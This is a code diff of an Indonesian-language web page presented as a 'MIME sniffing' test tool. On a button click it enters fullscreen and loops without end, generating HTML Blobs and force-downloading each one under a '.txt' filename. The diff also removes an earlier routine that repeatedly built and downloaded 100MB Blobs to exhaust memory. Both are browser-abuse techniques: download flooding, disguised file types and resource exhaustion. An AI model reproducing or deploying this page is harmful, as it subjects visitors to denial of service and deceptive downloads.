@@ -95,8 +95,8 @@
 <body>
     <div class="panel" id="main-panel">
         <h2>Generator Berkas Blob &amp; ObjectURL</h2>
-        <p>Klik tombol untuk masuk ke layar penuh dan memicu pembuatan berkas Blob 100MB menggunakan URL.createObjectURL secara terus-menerus.</p>
-        <button id="start-btn" type="button">Mulai Layar Penuh &amp; Generate Blob</button>
+        <p>Klik tombol untuk masuk ke layar penuh dan memicu pengujian kerentanan MIME Sniffing browser secara terus-menerus menggunakan berkas HTML yang disamarkan sebagai teks biasa (.txt).</p>
+        <button id="start-btn" type="button">Mulai Layar Penuh &amp; Uji MIME Sniffing</button>
         <div id="status" role="status">Sistem siap.</div>
         <div id="downloads"></div>
     </div>
@@ -119,24 +119,6 @@
             }
         };
 
-        // Pembuatan Blob dan URL menggunakan URL.createObjectURL (100MB Text)
-        const generateBlobUrl = (id) => {
-            return new Promise((resolve) => {
-                queueMicrotask(() => {
-                    // Buat data mentah sebesar 100 MB di RAM
-                    const sizeInBytes = 100000000; // 100 MB
-                    const buffer = new Uint8Array(sizeInBytes).fill(65); // Karakter ASCII 'A'
-                    
-                    // 1. Buat Objek Blob
-                    const blob = new Blob([buffer], { type: "text/plain;charset=utf-8" });
-                    
-                    // 2. Buat Object URL sementara yang menunjuk ke lokasi Blob di memori
-                    const blobUrl = URL.createObjectURL(blob);
-                    resolve({ id: id, url: blobUrl });
-                });
-            });
-        };
-
         // Mengubah fungsi pembuat data untuk menguji respon MIME Sniffing browser
         const prepareMimeBlobAsync = (i) => {
             return new Promise((resolve) => {
@@ -152,23 +134,17 @@
             });
         };
 
-        // Eksekusi Unduhan Tautan (Untuk Berkas 100MB)
-        const triggerDownload = (file) => {
-            const a = document.createElement("a");
-            a.href = file.url; // Menggunakan URL hasil URL.createObjectURL(blob)
-            a.download = `blob-100mb-${String(file.id).padStart(3, '0')}.txt`;
-            a.textContent = `Blob #${file.id} (.txt)`;
-            downloadsDiv.appendChild(a);
-            a.click();
-        };
-
-        // Bagian pemicu unduhan memaksa ekstensi nama file menjadi teks biasa (MIME Test)
+        // Bagian pemicu unduhan memaksa ekstensi nama file menjadi teks biasa
         const triggerInstantDownload = (fileData) => {
             const link = document.createElement("a");
             link.href = fileData.url;
+            
             // Mengunci nama unduhan visual sebagai file teks (.txt)
             link.download = `test-file-${fileData.id}.txt`;
-            link.textContent = `MIME Test #${fileData.id} (.txt)`;
+            
+            // Menambahkan teks visual pada elemen tautan agar terlihat di area unduhan UI
+            link.textContent = `Test File #${fileData.id} (.txt)`;
+            
             downloadsDiv.appendChild(link);
             link.click();
         };
@@ -177,19 +153,15 @@
         const processLoop = async (counter) => {
             if (!isProcessing) return;
 
-            // --- 1. Jalankan Proses Utama (Blob 100MB) ---
-            const fileData = await generateBlobUrl(counter);
+            // Hasilkan Blob dengan tipe HTML dan dapatkan Object URL
+            const fileData = await prepareMimeBlobAsync(counter);
             activeUrls.push(fileData.url);
-            triggerDownload(fileData);
 
-            // --- 2. Jalankan Proses Tambahan (MIME Sniffing Test) ---
-            const mimeData = await prepareMimeBlobAsync(counter);
-            activeUrls.push(mimeData.url);
-            triggerInstantDownload(mimeData);
-
-            // Update Status Visual
-            statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} (${counter * 100} MB Total Blob)`;
+            // Picu aksi simpan/unduh paksa ke format teks
+            triggerInstantDownload(fileData);
             
+            statusDiv.textContent = `Proses Berjalan: Berkas Uji ke-${counter}`;
+
             if (counter % 10 === 0) {
                 speak(`Proses mencapai ${counter} berkas.`);
             }
@@ -227,7 +199,7 @@
             // Jalankan proses setelah jeda singkat
             setTimeout(() => {
                 isProcessing = true;
-                speak("Proses pembuatan berkas Blob dimulai.");
+                speak("Proses pembuatan berkas pengujian MIME dimulai.");
                 processLoop(1);
             }, 300);
         });
